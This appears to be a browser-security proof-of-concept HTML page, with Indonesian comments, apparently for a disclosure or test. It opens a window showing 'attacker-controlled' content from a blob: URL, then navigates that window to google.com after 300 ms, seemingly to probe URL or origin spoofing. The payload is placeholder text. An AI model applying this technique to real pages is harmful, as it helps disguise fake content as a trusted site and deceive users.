<!-- attacker-blob.html -->
<!doctype html>
<meta charset="utf-8">
<title>Blob PoC</title>
<script>
function f() {
  const html = `
    <html><body style="font-family:system-ui;padding:30px">
      <h1>Blob Fake Content</h1><p>attacker-controlled</p>
    </body></html>
  `;
  const blob = new Blob([html], {type: 'text/html'});
  const url = URL.createObjectURL(blob);
  const w = window.open(url, '_blank');

  // setelah beberapa waktu, navigasi ke test domain
  setTimeout(() => {
    try { w.location.replace('https://google.com/'); } catch(e) { console.warn(e); }
    // revoke setelah tidak diperlukan
    URL.revokeObjectURL(url);
  }, 300);
}
</script>
<body><button onclick="f()">Open blob then nav</button></body>
</html>
